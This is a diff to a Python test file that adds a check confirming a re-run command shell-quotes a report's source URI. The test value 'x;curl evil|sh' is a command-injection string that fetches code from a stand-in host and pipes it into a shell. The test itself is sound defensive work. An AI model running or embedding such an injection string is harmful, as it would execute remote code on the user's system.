@@ -31,6 +31,7 @@ from nikasha.render.markdown import (
     link,
     render_markdown,
     render_markdown_result,
+    rerun_command,
 )
 from nikasha.resolve.target import Resolution
 
@@ -571,3 +572,17 @@ def test_only_timings_differ_between_two_runs_of_the_same_input():
     other = one.model_copy(update={"timings": {"ingest": 9.99}})
     assert one.to_json() != other.to_json()
     assert one.to_json(include_timings=False) == other.to_json(include_timings=False)
+
+
+def test_rerun_command_shell_quotes_report_derived_arguments():
+    # The maintainer pastes the re-run line into a shell; a hostile URI must stay one
+    # argument (P7).
+    report = Report(
+        id="report-1",
+        source=ReportSource(kind="markdown", uri="x;curl evil|sh"),
+        title="t",
+        body="b",
+        source_map=SourceMap.identity(1),
+    )
+    command = rerun_command(make_result(report=report))
+    assert "'x;curl evil|sh'" in command
